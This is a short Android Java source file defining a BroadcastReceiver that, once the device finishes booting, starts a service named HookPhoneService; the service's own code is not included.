package com.test.blingbling;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootStart extends BroadcastReceiver {
	
	private static final String TAG = "BlingBling";
	
	@Override
	public void onReceive(Context context, Intent intent) {
		Log.d(TAG, "Boot Start");
		if(intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED))
			context.startService(new Intent(context, HookPhoneService.class));		
	}

}
